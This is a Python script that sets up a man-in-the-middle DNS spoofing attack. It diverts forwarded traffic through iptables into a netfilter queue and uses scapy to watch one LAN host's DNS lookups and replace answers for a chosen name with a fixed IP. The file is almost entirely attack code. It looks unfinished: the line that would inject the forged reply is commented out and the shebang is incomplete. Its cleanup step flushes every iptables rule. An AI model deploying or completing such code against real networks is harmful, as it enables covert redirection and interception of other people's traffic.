#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import subprocess
import sys

def run():
    set_iptables()
    create_queue()

def set_iptables():
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for
                                                                                        # python 2.7 compatibility
    #subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for

    #subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for

def reset_iptables():
    subprocess.call(["iptables", "--flush"])


def create_queue():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, forge_response_packet)
    try:
        queue.run()
    except:
        print("[+] CTRL + C detected, resetting iptables")
        reset_iptables()
        sys.exit(0)



#def determine_stream(packet):


def forge_response_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.DNSQR): #checks for DNS REQUEST      
        qname = scapy_packet[scapy.DNSQR].qname #name in reply
        if ("google" in qname and scapy_packet[scapy.IP].src == "192.168.0.11"):
            print("question record")
            print(scapy_packet.show())
    
    if scapy_packet.haslayer(scapy.DNSRR): #checks for DNS REQUEST
        #qname = scapy_packet[scapy.DNSQR].qname #name in question
        rrname = scapy_packet[scapy.DNSRR].rrname #name in reply
        if "google" in rrname:
            print("reply packet")
            print(scapy_packet.show())
            #print(scapy_packet[scapy.UDP].show())
        if "tachibana" in qname:
            print(scapy_packet[scapy.DNSQR].show())
            print(scapy_packet[scapy.UDP].show())
            answer = scapy.DNSRR(rrname="plus.l.google.com", rdata="172.217.167.68")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            #packet.set_payload(str(scapy_packet))

    packet.accept()

run()
